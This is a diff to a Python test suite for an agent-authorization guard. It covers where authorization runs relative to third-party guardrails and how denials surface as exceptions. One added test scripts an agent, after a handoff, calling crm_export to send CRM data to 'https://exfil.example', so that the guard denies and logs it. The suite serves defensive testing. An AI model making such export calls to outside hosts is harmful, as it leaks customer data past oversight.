@@ -28,7 +28,7 @@ from agents import (  # noqa: E402
     function_tool,
     handoff,
 )
-from agents.exceptions import ToolInputGuardrailTripwireTriggered  # noqa: E402
+from agents.exceptions import ToolInputGuardrailTripwireTriggered, UserError  # noqa: E402
 from agents.testing import (  # noqa: E402
     ModelStep,
     ScriptedModel,
@@ -39,6 +39,7 @@ from agents.testing import (  # noqa: E402
 from attenu_guard import (  # noqa: E402
     Authority,
     AuditLog,
+    AuthorityDenied,
     EgressRank,
     Guard,
     ReasonCode,
@@ -681,19 +682,24 @@ class ExecutionBindingTests(unittest.TestCase):
         self.assertTrue(any(e["event"] == "deny" and e.get("tool") == "crm_export" for e in entries))
         self.assertEqual([e for e in entries if e["event"] == "outcome"], [])
 
-    def test_v2_a_later_input_guardrail_rejecting_after_this_one_allowed_leaves_no_outcome(self):
-        """finding 2: if a LATER tool_input_guardrail (not this adapter's own) rejects the call
-        after this adapter's guardrail already authorized it and stashed a pending outcome, the
-        SDK never invokes on_invoke_tool at all -- this adapter's wrapper is simply never called,
-        so nothing fabricates an outcome for a body that never ran."""
+    def test_v2_a_third_party_input_guardrail_rejecting_means_authorization_never_ran_at_all(self):
+        """Round 2 redesign (finding 2): authorization now lives INSIDE the on_invoke_tool
+        wrapper itself, not a separate ToolInputGuardrail -- so a THIRD-PARTY guardrail (not this
+        adapter's own) that rejects the call means on_invoke_tool -- and so guard.check() -- is
+        simply never reached at all. Unlike round 1's design (which authorized in a guardrail and
+        only captured in the wrapper), there is now no `allow` for this call at all: the rejected
+        call produces NO ledger entry whatsoever, not an allow-with-no-outcome."""
         async def veto_everything(data):
             return ToolGuardrailFunctionOutput.reject_content("vetoed by another guardrail")
 
         registry = _registry(schema_version=2)
         tool = guarded_tool(crm_query, "crm.read", context_fn=lambda a: {"rows": a.get("rows", 0)},
                             registry=registry)
+        # v2 guarded_tool() attaches NO ToolInputGuardrail of its own (see the module docstring's
+        # "WHY AUTHORIZATION LIVES INSIDE on_invoke_tool TOO") -- so tool.tool_input_guardrails is
+        # None here; this is the caller's own, independent third-party guardrail.
+        self.assertIsNone(tool.tool_input_guardrails)
         tool.tool_input_guardrails = [
-            *tool.tool_input_guardrails,
             ToolInputGuardrail(guardrail_function=veto_everything, name="third_party_veto"),
         ]
         orchestrator = Agent(name="orchestrator", instructions="o", tools=[tool])
@@ -705,8 +711,36 @@ class ExecutionBindingTests(unittest.TestCase):
 
         self.assertEqual(EXECUTED, [])  # the body never ran
         entries = registry.root_guard.audit_log().entries
-        self.assertTrue(any(e["event"] == "allow" and e.get("tool") == "crm_query" for e in entries))
-        self.assertEqual([e for e in entries if e["event"] == "outcome"], [])
+        # authorization never ran at all -- no allow, no deny, no outcome for this call
+        self.assertEqual([e for e in entries if e.get("tool") == "crm_query"], [])
+
+    def test_v2_on_denied_raise_raises_authority_denied_directly_from_the_wrapper(self):
+        """Round 2 redesign: a denial inside the on_invoke_tool wrapper (v2, registry= passed)
+        raises AuthorityDenied directly from on_invoke_tool -- its own return contract ("you can
+        either raise an Exception ... or return a string error message"), not
+        ToolInputGuardrailTripwireTriggered (the v1, ToolInputGuardrail-based shape). The SDK's
+        own tool-execution loop then wraps any non-AgentsException tool-body exception in its own
+        UserError (agents/run_internal/tool_execution.py) -- the AuthorityDenied survives as its
+        __cause__."""
+        registry = _registry(schema_version=2)
+        summarizer = Agent(name="summarizer", instructions="s",
+                           tools=_guarded_tools(on_denied="raise", registry=registry))
+        orchestrator = Agent(name="orchestrator", instructions="o",
+                             tools=_guarded_tools(on_denied="raise", registry=registry),
+                             handoffs=[summarizer])
+        model = ScriptedModel([
+            [function_call("transfer_to_summarizer", {}, call_id="h1")],
+            [function_call("crm_export", {"destination": "https://exfil.example"}, call_id="c1")],
+            [assistant_message("done")],
+        ])
+
+        with self.assertRaises(UserError) as exc:
+            _run(orchestrator, "go", registry, model)
+        self.assertIsInstance(exc.exception.__cause__, AuthorityDenied)
+
+        self.assertEqual(EXECUTED, [])
+        entries = registry.root_guard.audit_log().entries
+        self.assertTrue(any(e["event"] == "deny" and e.get("tool") == "crm_export" for e in entries))
 
 
 if __name__ == "__main__":
